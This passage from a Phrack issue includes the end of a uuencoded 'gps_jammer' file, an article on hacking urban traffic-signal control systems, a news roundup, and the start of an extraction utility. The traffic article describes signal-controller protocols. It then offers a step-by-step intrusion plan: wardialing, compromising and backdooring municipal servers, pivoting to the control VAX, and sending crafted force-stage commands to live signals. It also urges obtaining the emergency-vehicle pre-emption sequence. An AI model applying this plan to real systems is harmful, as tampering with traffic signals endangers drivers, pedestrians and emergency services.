M95\WJ(&gt;5YS5@)E)D`T_]]6$&amp;$7YG%@5CV._&amp;P[!`M*&quot;0&amp;BCKN^E]IYC`O0Z_
M]4%(]W3=R5;H0*HPD!_(&lt;0+-3&gt;T&#039;=%QLX!^Y..F^&quot;&quot;I26=YH\&#039;7=4ZZAEY/S
M[2IOY(-45F75F._]GD[[I$Q[F#0ANDH%Y&lt;$G&quot;5\W&lt;B0CB;IQ$]-=ZRV`2KYB
M]+#:@G:/D#NG_3BK=W0\F)-5G)9QU+O;[CU*=9(PWH&#039;U=/Q-G-IZ2LMN#B`Y
MR/33/&gt;86F&quot;?_3@5]S2L@_=F/=&quot;,VUJ]&#039;[(&amp;HBZX(6OFN7.MKKP3@^WE8?=N6
MKOFTIPHU;.C4P1@NV#ZSKQS#W&amp;[@&#039;(8DC[+&lt;89^=IG?U%;:MLB0^D9D8U[P;
M(*`;3Q@W5J_&gt;ZOL0F(*,KZ#.&gt;VZ*CN`E$8&gt;)&gt;^L4CVI+]EW+;B`Y/I7BU^,R
MEG1N&lt;[5LERR1SN%L_TB6[FVCP]&#039;+*E-5:&gt;L&lt;@Q^&amp;&#039;,TA5R4U+R1N&gt;^@&amp;%7G0
M]\D&#039;&amp;&lt;X&amp;412W7@GA,67&gt;O13W/,%DX]&gt;Y!GU_%&amp;G&quot;OPCD&gt;9&gt;=T7)Q&amp;GR%C78H
M/:XQ[Y81WZ)`?Y1_K*Y]RR+.;;U&#039;E:@:+K3TA#8D*&lt;DWEY&amp;]ST%ZQQ2PJF=X
M:P^9&amp;[&gt;ZMG?W2#EA&#039;/$^=_=(C,JNXB0K@/.&#039;&lt;YU=[=GJ3=(YO19X$&quot;A5&lt;&lt;X`
M$%61M/N!+&quot;54.@)$57A$%`#B)&#039;8ZJHI[0/=:2\.6;Z$M!+T##AR+,&quot;MM&#039;&amp;#@
MC&lt;G$,(JBZVRE`7BV%&quot;W\P!N&lt;&quot;=Y-5.H?_J1!T],&gt;3WF.D0;?:2?5OC&amp;.4&#039;K5
MFP,^P#?&quot;GMJ\M`&amp;V$78&#039;_*&lt;W`VQ#_]A&gt;JYN^_3D&lt;!N2;R^A!WJL!!]W+T23Q
MM7,G1UJI%GT&#039;B,UU;Z)_JG.*?:G+[1L*&quot;)1ZKOYH(%UE&lt;?;-`DV(]\;`(&amp;,H
M&lt;_@&gt;?*$%VF.+N1Q49&quot;$ZS0TG#\AP`J#LO*3S-!VR6:B)3:74AC\:0.UKF;-6
M5=(^_I3J!%[B+[YZ7CD169/*&gt;+/D^19%[MS)5?-)&amp;8&#039;TPY!4W?U1(08J]*9_
M#,ABROMO%9F6)X-Y-S&#039;%9&gt;S[@Z;Q23G8AM\&amp;Z+^;+(OV*]4K$W#SO)=[=&amp;+K
M8/R8LCHF]&#039;-2:B!B\&amp;9VPA&lt;SHF\):(_(XIWP)7.;$&gt;3.+&amp;&gt;B1-UT#C&gt;;BN_M
ME@&amp;KB70EBV3:2PIYN*PF*5N9R*W&lt;&#039;^I&lt;=AT)+0UIZ:P&#039;U]0D*QD*&gt;&gt;;5=:J&amp;
M&quot;UY[4=&gt;07O5&lt;:C;O]RO3]C5+=?@:J3B]_](8OQ66@#*RYUJ1X.FVGG^8&#039;9H9
M?@/W]GO@Y/OS&amp;!V_1-QZ+B^E_2/0\ILD[B0;/$,IF+?I-Z$?M,KX/H^#?BB)
MN:A:3L&gt;LJQ8[.=&#039;#KU)(]-L*^ND*=*E&amp;)2ZT,B[`+6&lt;O&gt;&quot;]6&amp;]&#039;&lt;W.[_362/
MQX1+$VL7N6?#P-,/.-W@T8T+NR9=#4&quot;)!^A&#039;F:OT&#039;J=(G2&#039;ZUH&amp;SPKJ_8*%_
MN&quot;+.\YYNT2Y/I?RM7I8)&#039;L%15VA,^-&lt;&gt;OK.2:O1AZ&#039;UV[ZKU&gt;SJFUY0QT2M4
M/2.U[R/JY/)SH(I^#=94WR.7BMQ&quot;QY@8!V_/#A_V^).TCJ,9Q&#039;#*;$+!&lt;#N`
MI!J8`#X&#039;&lt;U[91:&lt;5(,M/U^(%7J?:`&gt;^@Y:BS!&#039;O+;)!2&amp;1&gt;Y:V2X,9&#039;81D;P
MY0K\RH7C0=*$WJ!0M5Y8[P0T5,0=WZ_-+W_U9:\JH-P-T/?W6+X?2`&amp;SL$-O
MJV1?^[0CY&amp;AO&lt;,FWYMW@-Y5\)I_ZP0/TPWQO75%`YO@C38._AB+I;=Q4%7M&gt;
M?.28SUPE@^$A&amp;SEBQ1[HSE`2!0]G;,J&lt;3=-REC3,^]N;6W&amp;+;_87^\-NM5VO
M-D,W+G.=9Z7$]=&gt;_BZ&lt;_@K(8DVJ$&amp;;R#+_A_OOJXK&amp;&gt;77V;=7[(Z\M).&gt;F6T
M\;:&gt;S3=+&lt;3Z&#039;&#039;&gt;8^+]?BG[-I!_6F+WY[_^+=FZ&gt;O1HR.!&lt;&quot;Y+GKVZ^GX9KVS
M1&#039;[Q+5I+7(I&quot;N=Q\]&amp;//L@W0]GH__UCCO@2[4HW)7)^V\^MZ,GG\^/UNOEK7
9N\EO9S^].W.AH.[%VY&gt;3_PU&#039;_`Z`=[X`````
`
end

&lt;--&gt; ./gps_jammer.ps.gz.uue

|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x0e of 0x10

|=------------------------=[ Traffic Lights ]=---------------------------=|
|=-----------------------------------------------------------------------=|
|=-----------------------=[ plunkett@hush.com ]=-------------------------=|

.:Saving the planet, again:.

/* 
 * This is purely educational; 
 * Any knowledge gained from this document is self imposed and thus
 * the author cannot be held responsible. Any activities resulting from
 * knowledge gained in this document is not accountable by the author.
 * If you do not accept this, please refrain from reading further.
 *
 */
#include &lt;disclaimer.h&gt;

A more environmentally friendly way of traveling by car. As some
of you might recall in almost all the hacking movies, books, TV shows, etc.
there has been a case of someone fiddling with traffic lights. Well we all
just giggled at the unrealistic aspect of it and didn&#039;t think twice. Well in
my quest for a more appealing planet for our children I felt compelled to
think of a way in order to reduce the amount of pollution emitted by
vehicles of today.
Standing at a intersection, nobody else around, you&#039;re still stuck behind the
red light, and this invisible barrier of governmental guilt has enough power
to let you wait there and pollute the air more and more, just for a measly
green light. Wouldn&#039;t it be leet having a laptop in the car where you could
just select the intersection off a list, change the timing or current stream
running, and ride off with fewer time wasted and fewer pollutants exhausted
and a clear conscience.

Now, enough crap about the reasons, now for the technical shit.

Today&#039;s traffic controlling system is a well oiled redundant network that
utilizes the same protocols that we are all aware of. Yes it is hackable
and it is like in the movies. :)
here we go!

a description of some of the terms used.

 - controller
        This is the technical term for a traffic light and will be
        referred to that way.
 - UTC
        Urban Traffic Control, solid-state signal controllers connected
        to central computer by means of PSTN. Provides communication
        standard for controllers (see fig. 1)

 - SCOOT
        Split Cycle Offset Optimization Technique.
        A standard now implemented across majority of traffic systems
        across the world. It provides adaptive control of controllers,
        this is done by the controlling office, it receives the traffic
        flow data from closed loops around the intersection, which it
        analysis and relays back current configurations in real-time
        back to the controller.

 - ITS  Intelligent Transport Systems, This is just a buzzword to describe
        the whole system covering everything, UTC, SCOOT, CCTV(video) and
        the whole protocol stack interlinking all of it. (see fig. 2)

 - NTCIP
        This is the protocol that is in process of becoming a standard
        for traffic management communications. It is based on TCP/IP and
        revolves mainly on SNMP that has specific MIB&#039;s for use in
        controller messaging. (protocol may vary from country to country)
        Some controllers in US are NTCIP compatible, namely Thereon and model
        170 of NEMA controllers. CCTV, VMS, Field Processors, Ramp metering
        are all linked via NTCIP.

 - ATC
        Area Traffic Control, This is the Central office that control
        all the aspects of traffic control management.

 - FEP
        Front End Processor, Virtual Processing for controllers. located
        before management computer, and connected directly to controllers
        via instation modem rack or telemetry hardware. One FEP
        supports up to 512 PSTN lines.

 - OTU
        In UK this is the Outstation Transmission Unit, this provides the
        means of converting serial data coming from the central computer
        to parallel data for use in the controller, and provides
        interchangeability of controllers.
        (I&#039;m not sure if this system is a standard across the world, for
         South Africa it is done by a CCIU Controller Communication Interface
         Unit}
 - CMU
        Cabinet Monitoring Unit, This is what detects when you fiddle inside
        the box next to the road. It reports hardware/software faults and
        packages the data for reporting to the FEP and ATC.



Figure 1.  Different link arrangements
-------------------------------------

                  ---0 junction 1
                 /
   0------------0----0 junction 2
 CENTRAL  LOCAL  \ 
 OFFICE  EXCHANGE ---0 junction 3

              [UTC Radial Arrangement]


                  ---0  junction 1
                 /    \
   0------------0      \
  C.O          L.E   0-- junction 2
                       /
                      /
                     0 junction 3

           [UK Multi-drop UTC arrangement]



Figure 2.  ITS Topologies
-------------------------

         ________     ________        ________
        |COMPUTER|---|COMPUTER|------|COMPUTER|
        `--------&#039;   `--------&#039;      `--------&#039;
  (coax)    |_____        |  (dialup)    |__    (radio)
                  |       |                 |
      __________  |   ____|_____       _____|_____
     |CONTROLLER|-|  |  MASTER  |__   |FIELD PROC.|__
     `----------&#039; |  `----------&#039;  |  `-----------&#039;  |
      __________  |   __________   |   ___________   |
     | VAX/VMS  |-|  |  VAX/VMS |__|  |CCTV CAMERA|__|
     `----------&#039; |  `----------&#039;  |  `-----------&#039;  |
      __________  |   __________   |   ___________   |
     |COUNTSTION|-|  |CONTROLLER|__|  |CONTROLLER |__|
     `----------&#039;    `----------&#039;     `-----------&#039;  |
                                       ___________   |
                                      | VAX/VMS   |__|
                                      `-----------&#039;

    (Physical links   (Physical links   (physical links
     EIA 232)          FSK-modem)        Fiber)




Introduction
------------

The traffic controller boxes that you see on the road have all a standard
configuration set when commissioned, but they are all linked to a central
office for remote configuration changes, fault reporting, resetting, etc.
The ATC houses a FEP which connects to each controller or the local exchange.
The FEP is the direct network connection to the controllers and queries the
controllers per second bases and receives the responses which are transported
to the central controlling computer [OS/2 or ALPHA VAX in S.A and UK] via
DECnet on coaxial or other means via the LAN. The controlling computer then
analysis the result and determines faults or other data and places it in the
central controlling database on a VAX/VMS. The database is then prioritized
and can be accessed via web interface on the local intranet to see fault
reports and timing info.

When a reconfiguration is issued, an operator can set all configurations
remotely even if a total controller reset is required. This includes stream
timings (streams are the various timing configurations), local time, light
dimming, emergency stream (for ambulances and such), the different settings
will be discussed later. When the operator requests a change in configuration,
it is sent to the FEP in a large datagram which is split up and modulated
for communication to the controller. The protocols between the OTU/CCIU and
the FEP is usually not a standard, and propriety protocols are setup by the
manufacturers of the units.
                  
a diagram of how UTC is interlinked is shown. (fig. 3)
                           
figure 3. Protocol and physical link diagram of UTC system
----------------------------------------------------------
                            ATC                  IN CONTROLLER BOX
   ____________                           :
  |UTC COMPUTER|           RS232 SERIAL   :
  `------------&#039;                          :         SERIAL
         |                    ___ ______  :   _____   :   ________
         | DECnet-&gt; _______  |___|MODEM |-/--|MODEM|-----|OTU/CCIU|
TCP/IP   |---------|  FEP  |_|___| RACK | :  `-----&#039;     `--------&#039;
ETHERNET |         `-------&#039; |___`------&#039; :                  | RS232
LAN   -&gt; |                                :                  | SERIAL
         | (NTCIP encompassed)            :               ___|______
         |   protocols                    :              |CONTROLLER|
         |    _______                     :              `----------&#039;
         |___|       |                    :
             `-------&#039;                    :
             misc. devices                :
             like VAX/VMS for             :
             fault monitoring
             and such.


The communication between the controller and the ATC is done via a 
bit stream signals where certain bits represent a preprogrammed
function in a controller.
A serial second-by-second bit stream is received by each controller
continuously and is converted to parallel for use inside the controller.
The stream consists of 16 bits, Thus 32 parallel connections can be initiated
with the controller, and certain bit streams control certain functions and
some have a return value for example to notify the controller which stream
currently is running. The communication may look similar to this.

1001011011011101 sent
1000101111010101 received

as said, the comms protocol is more than likely to be propriety and thus non
standard. eg. The control bit 10 may &#039;mean set max green time 30s&#039; and in
another, &#039;hold vehicle stage&#039;. but according to ATC standards globally,
there are a couple of standards like stream control, emergency control
and resets and more nifty features. 

But this is not important because access to the controlling computer is in
anyway necessary for control of the controller, and thus the specific
protocol used doesn&#039;t matter.


----------------------------------------
communication technical details, yummy!
----------------------------------------

UTC messaging
-------------

Below is a typical description of the communication between the controller
and ATC. UTC is the current system that is used in majority of ATC
centers across the world. And communication is pretty much standard.
The specific messaging data bits might be different in different
countries since it is done proprietly by the controller and system
manufacturers. But they tend to stick to a standard, South Africa is based
on the UK system, And the UK system is the same as America, and so it all
will look basically the same, except for area specific functions.

UTC Control and Reply Bits  (Fn = F1,F2,F3... different stages, same for Dx) 
---------------------------
Control      Description                        Reply

Dn (or Dx)   Demand Individual  Stage           SDn/SDx
Fn           Force Stage
FM           Fall Back Mode                     FC
HI           Hurry Call Inhibit
             Stage Confirmation, Stage n        Gn
             Hurry Call Confirmation or Reqst   HC
             Manual Control                     MC
             Emergency Vehicle                  EV
             Vehicle Red Lamp Failure 1         RF1
             Vehicle Red Lamp Failure 2         RF2
SFn          Switch Facility                    SCn
SO           Solar Override
SG           CLF Group Timer Synchronization    CG
LO           Lamps On/Off                       LE
LL           Local Link Inhibit
TS           Time Switch Sync Stored Value
TO           Take Over
TC           Transmission Confirm
CP           Close Car Park                     CL
             Detector Fault Monitor             DF
             CLF Group Timer in First Group     GR1
             Remote Reconnect                   RR
             Entry in Controller Fault Log      CF
             Handset Connected                  TF
             Lamp Fault                         LFn
             Car Park Occup Thresh Exceeded     CA
             Pedestrian Green Confirm           PC
             Queue Detector Presence            VQ
             Detector Vehicle Count             VC
             Car Park Information               CSn
             Queue at Car Park Entry Reservoir  CR
             SCOOT Detector Presence            Vsn
             Cabinet Door Open                  CO
PV           Hold Vehicle Stage
PX           Demand Pedestrian Stage
             Puffin Clearance Period            PR
             Vehicle Green Confirm              GX
             Wait Indicator Confirm             WI

A controller is typically setup to receive 16 to 32 bits of control bits
which can be be replied to by the controller using a reply datagram.
(note that SCOOT specific functions are done in the same way)

typical Control UTC message:

Bytes 1,2 Control Bytes (Address 2)
Byte 3 (F1,F2,F3,D2,D3,DX,SO,-)    (check above table for bit descr)
Byte 4 (-,-,-,-,-,-,-,TS)
      
0 0 0 0 0 0 1 0 0 1 0 1 0 0 1 0 0 0 0 0 0 0 0 0

typical Reply UTC message:

Bytes 1,2 Reply Bytes (Address 2)
Byte 3 (G1,G2,G3,-,-,DF,CF,-)      (check above table for bit descr) 
Byte 4 (-,-,-,-,-,-,-,RT)
      
0 0 0 0 0 0 1 0 0 1 0 1 0 0 1 0 0 0 0 0 0 0 0 0

The communication is done asynchronously and in the controller represented
as parallel, whereas in the FEP its serial. The modulation can be done
either by FEP or instation specific controller cards.


NTCIP Messaging (UK and some US ATC&#039;s)
--------------------------------------

I am not going to discuss the specific NTCIP messaging system because it
is not set as a standard yet, and basically, because I haven&#039;t had the
pleasure of playing with it. America (except NY and other big
cities), South Africa, Namibia and I think majority of countries
across the world still use SCOOT capable UTC primarily whereas
UK is adopting it as standard.

The NTCIP stack:

Layer           Class A         Class B         Class C
-------------------------------------------------------------
Application (7) SNMP/STMP       SNMP/STMP       SNMP/STMP/FTP
Presentation (6) -              -               -
Session (5)      -              -               -
Transport (4)   UDP             -               TCP/UDP
Network (3)     IP              Null            IP
Data Link (2)   HDLC            HDLC            HDLC
Physical (1)    RS232/FSK       RS232/FSK       RS232/FSK

A and C are not standard but could be used. For
tcp compatibility and routing.
A and C can be implemented as well as additional TCP/IP stacks.

B is defined as standard and is used for bandwidth efficient exchange of
data but does not provide assurance of delivery, this is in turn done
by the physical layer for necessary retransmission.

B only contains three layers, application, data link, physical layer.
This is because the constant line between office and controller is fixed
and thus no routing is necessary and SNMP includes the session features.

NTCIP and SNMP and some STMP:

SNMP commands:
-get
-set
-get Next/get Bulk
-trap

The manager (ATC) may send out &#039;get&#039; command to retrieve information from
the agent (CONTROLLER) and waits for a reply. But SNMP does not provide
for the agent to initiate contact, and thus the manager polls periodically
with the &#039;trap&#039; command. This is done on a per second basis.

The typical SNMP frame is 37 Bytes
----------------------------------------------------------------------------
|ver|community|command|req id|error status|error index|objct id|objct value|
----------------------------------------------------------------------------

ver=
      SNMP v1 -NTCIP v2 included security features which they thought
      was a waste of bandwidth- ;)

Id flag=
      is used for matching up the messages with replies

community name=
      essentially a password

core message in Object ID and Value=
      the controller control data and reply section

SNMP is a bandwidth eating protocol, so they designed the STMP
(simple transportation management protocol) which is a cut down vers of SNMP.
It uses the same commands but has the added benefit of having no header and
using dynamic objects. Dynamic objects can encompass a number of variables
like time, date, year and all in one object. The objects are defined online
and both the instation and outstation parties know what the object describes
and thus just a single value needs to be transmitted. The typical size of
an STMP message is 1 byte, with a maximum of 13 dynamic objects.


Comparison Between UTC and NTCIP Messaging
--------------------------------------------
                        UK UTC          NTCIP Class B
Polling cycle           1s              1s
Message size            Fixed           Variable
Device Variables
transmitted             All             Only parameters to be changed
Value of device
variable                Bit             Integer or Bit
Protocols               Proprietary     Standardized



-----------------------------------------------
Hacking the Traffic lights GOdDamnit! #$@#%@#%
-----------------------------------------------

Ok I wanna save the environment now, with my new UhbEr
technique.

Basically, the idea is to get access to the VAX/VMS database or the controlling
computer itself. Now since this is on a internal LAN, and runs on DECnet
we have to find clever ideas to get in.

Some social engineering can help you a whole lot.
Phone your local municipality, or check out websites, newspapers or
anywhere, where specifically, the ATC is situated. Now you will get the contact
numbers of people who work there or such, maybe a fault reporting number.
Fire up your wardialer and start scanning the prefix. They should have
a server where they dialup to commission a new controller or when a new
software d/l is needed in the field. In South Africa this is a computer
running DOS with pc-anywhere on. But if they are clever, like all of the
centers I&#039;ve seen, they would have a dial-back facility, if not, your in luck
cause then you are directly linked to the internal LAN, and should start
hacking the VAX or FEP. The FEP note, is normally a propriety system, like
in South Africa, runs on DOS with some major serial comms protocols. Better
the get access to the VAX/OS2 controlling computer for a more familiar
system, although the FEP has more control of controller system messages.
And you can access the serial connections to the modems directly.

If you are unlucky and have a clever ATC. You must devise another means of
access to the internal LAN. In my experience the LAN is always connected to
the local municipality WAN for mail purposes and for access to the local
intranet for database driven fault reporting. Now to gain access to the local
WAN is not that difficult, since they are usually very big and provide
gazillion services like websites, mail servers for municipal workers and such.
Now Hax0r a web server or something and backdoor it *VERY* *VERY* well. You
gonna need it a lot, maybe backdoor a couple. :)

Now on the local WAN, you can probably access the nameserver to the ATC LAN
or you can access it directly. I&#039;m not providing a tutorial on hacking, just
means of access, so sniff email, network traffic blah blah... till you get
access to the VAX or controlling computer.

Now once your in, backdoor it *VERY* *VERY* *VERY* well ;)
you should use all the vax hiding tools and shit, look thru phrack for VAX/VMS
hacking. There are a couple of nice SHOW USER hiding tools and stuff 
written by mentor and a few others. And once you are in, check
what is on the DECnet, and maybe see if it is linked to other ATC&#039;s.
From here you can access the controlling computers, FEP&#039;s and everything.
Try to see the serial connections directly via FEP or see the communication
from the controlling computer, so you can figure out the format of messaging
controllers. Or if you are lucky, you can access the program itself 
used for messaging, if its terminal friendly.

Now find a controller that you have the location for, the addresses are
pretty easy to figure out most of the time or just browse through the
VAX database of fault reports or check the local intranet. Now construct
a suitable message and datagram from captured data, and make it do something
noticeable like:   UTC message - PX    DEMAND PEDESTRIAN STAGE
Hopefully, you have a laptop or something, go down to the controller
that you intend to send the message to. Now you will notice that all this is
done over tcp/ip, since you link to the LAN where you get onto the VAX/VMS
DECnet and in turn the controlling computer/FEP. So send through the command
and watch if the controller obeys you. If it does then you can start script
the whole procedure ;). make nice timings for ENVIROMENTLY friendly travels
between destination A and B. Also the commands to force a stage is nice to
have, UTC message - Fn  ; now if your stuck behind a red light, and just
sitting there polluting the air, just force to next stage in stream, and
off you go without the guilt of crossing a red light ;)

Also if you are browsing the LAN, look out for nifty info like, the source
to the firmware of controllers since the firmware gets updated quite often.
It might lay around on the dialup server or some internal ftp server.
The exact frequency and bit sequence used to initiate the emergency cycle
in the controllers, for ambulances and emergency vehicles is also nice. 
There is also the software that is used to commission the controllers 
and the hand unit for field monitoring.  

Of course hacking the traffic system can be abjo0zed and have disastrous 
effects, but i feel, if you have the skill to access a system like that, 
then you have the sense not to fsck it up.


|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x0f of 0x10

|=----------------=[ P H R A C K  W O R L D  N E W S ]=------------------=|
|=-----------------------------------------------------------------------=|
|=---------------------------=[ phrackstaff ]=---------------------------=|


Content in Phrack World News does not reflect the opinion of any particluar
Phrack Staff member.  PWN is exclusively done by the scene and for the
scene.

  0x01: Phrack Headlines &amp; Misc
  0x02: Freedom strikes back - DMCA loses the trial
  0x03: MS issues 71 security bulletins this year and counting...
  0x04: U.S. Patriot Act

|=[ 0x01 - Phrack Headlines &amp; Misc ]=------------------------------------=|

Video games with violent content are good for da kids! I KNEW IT!
http://www.vnunet.com/News/1135410

The News Media propose to not broadcast (i.e. to censor) certain
reports. The &#039;Free&#039; media is turning (some say it already turned) into an
instrument of the military. But dont worry too much about it: It&#039;s all
for our good!
http://commondreams.org/views02/1218-01.htm

Join the teleconference with the National infrastructure and Advisory
Council. The Council advises the President of the United States on the
security of information systems for critical infrastructure supporting
other sectors of the economy, including banking and finance,
transportation, energy, manufacturing, and emergency government services.
At this meeting, the Council will continue its deliberations on comments
to be delivered to President Bush concerning the draft National Strategy
to Secure Cyberspace.
http://www.access.gpo.gov/su_docs/aces/fr-cont.html

The promise of the newly formed Department of Homeland Security is to
improve our nation&#039;s security from terrorism. Unfortunately, the results
are far more likely to be the opposite.
http://www.counterpane.com/crypto-gram-0212.html#3

Kevin Mitnick wrote a book, &quot;The Art of Deception&quot;. The first chapter
has been deleted by the publisher at the last minute. It&#039;s available
on the internet:
http://www.wired.com/news/culture/0,1284,56187,00.html
http://littlegreenguy.fateback.com/chapter1/Chapter%201%20-%20Banned%20Edition.doc

Cyberterrorism is just media hype. It&#039;s yet another trick used by the
military-industrial complex to suck the last cent out of your pocket. The
world will not forget when the Pentagon announced the &quot;best coordinated and
most serious hacker attack against military installations&quot;. In the end it
was one single script kid who tried a public exploit against some
unimportant and unclassified military computer and gained access due to a 2
year old bug.
http://www.wired.com/news/infostructure/0,1377,56935,00.html

Read this before you visit any other countries. Otherwise you may
get arrested and prosecuted (in some cases executed!) in a foreign country
for an activity that is _legal_ in your country:

Flashn, a (famous) swedish hacker recently got arrested while trying to
escape the United States border to Canada. It seems that he had stayed
too long on his tourist visa.
http://www.freeflashn.org/
http://www.mail-archive.com/full-disclosure@lists.netsys.com/msg01684.html

Sk8 is out of prison but not free yet:
http://www.freesk8.org/

&#039;Analyzer&#039; is back in jail again:
http://www.freeanalyzer.org/

&#039;Out of office&#039; mails are fucking annoying. Read about yet another
reasons why you don&#039;t want to use them:
http://abcnews.go.com/sections/scitech/DailyNews/burglary021219.html

Computer Crime Center opens:
http://www.thestate.com/mld/thestate/news/local/4763628.htm

Get rooted while listening to mp3&#039;s:
http://news.com.com/2100-1001-978403.html?tag=fd_top

Microsoft&#039;s products have been left off a list compiled by the Defence
Signals Directorate that aims to evaluate and advise whether software
is appropriate for use by Australian Government agencies.
http://www.zdnet.com.au/newstech/security/story/0,2000024985,20270727,00.htm


|=[ 0x02 - Freedom strikes back - DMCA loses the trial  ]=----------------=|

The Russian software company which had found itself on trial in an
American court was acquitted on all counts of circumventing the DMCA.

Elcomsoft&#039;s woes began in August of last year, when programmer Dmitry
Sklyarov was charged under the Digital Millennium Copyright Act&#039;s
circumvention 1201 clauses (one small part of which is under review by
the Librarian of Congress) while visiting Las Vegas for a technical
conference. Skylarov was imprisoned for his part in creating an Adobe
eBook reader that permitted fair-use of copyright material, and
imprisoned pending trial.

&quot;Today&#039;s jury verdict sends a strong message to federal prosecutors
who believe that tool makers should be thrown in jail just because a
copyright owner doesn&#039;t like the tools they build,&quot; said EFF Senior
Intellectual Property Attorney Fred von Lohmann.

http://www.theregister.co.uk/content/55/28612.html
http://www.theregister.co.uk/content/6/28654.html
http://www.phrack-dont-give-a-shit-about-dmca.org
http://www.nytimes.com/2002/11/21/technology/21COPY.html
http://www.theregister.co.uk/content/6/28223.html
http://www.wired.com/news/business/0,1367,56504,00.html
http://www.fatwallet.com/forums/messageview.cfm?catid=18&amp;threadid=126042
http://news.com.com/2100-1023-976296.html


|=[ 0x03 - MS issues 71 security bulletins this year and counting...  ]=-=|

Are you keeping up with all the patches Microsoft has issued?
Microsoft has issued 71 security bulletins so far this year. One
bulletin in particular, MS02-069 (Flaw in Microsoft VM Could Enable
System Compromise) issued December 11, addresses several problems with
the Microsoft Virtual Machine (VM) used for Java code. Versions of the
VM software through version 5.0.3805 are vulnerable. According to
Microsoft, &quot;The most serious of these issues could enable a Web site
to compromise your system and take actions such as changing data,
loading and running programs, and reformatting the hard disk.&quot; The
patch is a critical update, and everyone should install it.

http://www.microsoft.com/security/security_bulletins/ms02-069.asp


|=[ 0x04  - U.S Patriot Act ]=-------------------------------------------=|

by, Ross Regnart

Patriot Act redefine MAFIA and Others as &quot;Terrorist Associates&quot;

    Under the Patriot Act the U.S. Government can use a &quot;new charge&quot; to
arrest Mob members. The Act redefined &quot;Terrorist Association&quot; as any
criminal activity that may &quot;relate&quot; to supporting terrorists.

    For Prosecution, the U.S. Patriot Act merged common criminal activity
with supporting terrorism: The ACT states: criminals and terrorists use the
same criminal networks and organizations to &quot;Market&quot; illegal-drugs; both
participate in and have an interest in world criminal activity.&quot; 

    Police Can Now Use Secret Evidence Against Anyone: The Act opened a
back door for police to use &quot;secret evidence&quot; against non-terrorists and
alleged criminals. Secret evidence are evidence that has been gathers in
an illegal manner, without the authorization of a judge by federal
agencies. Government need only allege an individual or organization&#039;s
activities &quot;relate&quot; to a &quot;criminal market that terrorists use or depend on
for their support in order to cause an arrest and/or property confiscation.

    What is a &quot;Terrorist Associate? The Patriot Act&#039;s wording &quot;relate to&quot;
&quot;join&quot; &quot;influence on&quot; &quot;assist&quot; &quot;support&quot; and &quot;criminal market&quot; are so
vague, government may charge as &quot;Terrorist Associates&quot; both legal and
illegal businesses and individuals who never intended to support
terrorists. It is foreseeable &quot;illegal drug marketers&quot; will be charged as
&quot;Terrorist Associates&quot; since it is appears impossible to stop terrorists
from using their networks to sell drugs or other criminal activity. Under
the Act police need little probable cause to arrest citizens and only a
&quot;preponderance of evidence&quot; to confiscate their property. Innocent citizens
may find it difficult to defend against  &quot;secret evidence&quot; and/or recover
their confiscated bank accounts and other property. Under the Act
&quot;a government authority&quot; to seize foreign bank accounts, need only claim
that a  financial transaction, account proceeds or property are &quot;related&quot;
to criminal activity. 

    Under the Patriot Act: U.S. and  cooperating government authorities are
not required to &quot;trace&quot; prove the  source of a foreign bank or financial
service account in order to seize all the proceeds therein. Should the
United States or a government authority find that a  foreign bank account
has been drawn down or closed  the government may &quot;substitute for
forfeiture&quot; any other  asset  a government claims to belong to the alleged
owner of a bank account then subject to forfeiture. Consequently, a
government may  &quot;substitute for forfeiture&quot; assets &quot;equal&quot; to the entire
amount of all financial transactions and deposits that went through a
foreign bank or financial service account during a given time period. 

    Under the Patriot Act: the U.S. or a cooperating government authority
is not required to prove what part of proceeds seized from a foreign bank
or service account  are &quot;related&quot; to criminal activity. The U.S. or a 
cooperating government authority may confiscate a foreign bank account and
&quot;never&quot; inform its owners the reason for confiscation or  the evidence
against their account that caused its confiscation. Innocent account owners
may be defenseless under such circumstances.

    Charged Defendants Under the Act start out guilty having to prove they
did not reasonably have reason to know the person(s), organization or
entity they associated or networked with had committed a terrorist act or
would commit one in the future. 

    What constitutes Terrorism under the Patriot Act may be arbitrarily
decided by police: Any physical act that is legal or illegal may be alleged
by police to be terrorism under 18USC 2331. Example: Union demonstrators
fighting with strike breakers. No one need be injured for police to make a
terrorist charge; demonstrators need only &quot;appear intended to intimidate or
coerce a civilian population; or to influence the policy of a government&quot;.
(See 18 USC 2331). 

   The Act&#039;s mention of &quot;related&quot; criminal activity and networks permit
government under the Act&#039;s anti-terrorism provisions to use &quot;secret
evidence&quot; against non-terrorists the government charges with being
&quot;Terrorist Associates&quot;. Government &quot;secret evidence&quot; can be used in both
U.S. Military Tribunals and Civilian &quot;Star Chamber Courts&quot; as provided for
by the Anti-Terrorism and Death Penalty Act of 1996. Defense against
government-paid and/or other secret witnesses may be difficult when
defendants are not allowed to learn the evidence against them. 

    Under the U.S. Patriot Act the Government got the power from Congress
to charge U.S. Citizens for crimes that &quot;relate&quot; to any activity that may
support terrorists or threatens the safety, economy, national security,
and/or U.S. or Foreign Policy of the United States. 


    CONCERN: Like imprisoned foreign-terrorist suspects in the U.S., could
American Citizens (non-terrorists) subsequently charged by the government
as &quot;Terrorist Associates&quot;, e.g., &quot;related criminal activity&quot; be next to
lose their right to have confidential meetings with attorneys? Could U.S.
Citizens be forced to give up attorney-client-privilege, endure government
agents sitting at their table whenever an attorney comes to meet with them
in jail? 


|=[ EO PWN ]=------------------------------------------------------------=|



--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x10 of 0x10

|=--------=[ P H R A C K   E X T R A C T I O N   U T I L I T Y ]=--------=|
|=-----------------------------------------------------------------------=|
|=--------------------------=[ phrackstaff ]=----------------------------=|

The Phrack Magazine Extraction Utility, first appearing in P50, is a
convenient way to extract code from textual ASCII articles.  It preserves
readability and 7-bit clean ASCII codes.  As long as there are no
extraneous &quot;&lt;++&gt;&quot; or &lt;--&gt;&quot; in the article, everything runs swimmingly.

Source and precompiled version (windows, unix, ...) is available at
http://www.phrack.org/misc.

|=-----------------------------------------------------------------------=|

&lt;++&gt; extract/extract4.c !8e2bebc6

/*
 *  extract.c by Phrack Staff and sirsyko
 *
 *  Copyright (c) 1997 - 2000 Phrack Magazine
 *
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
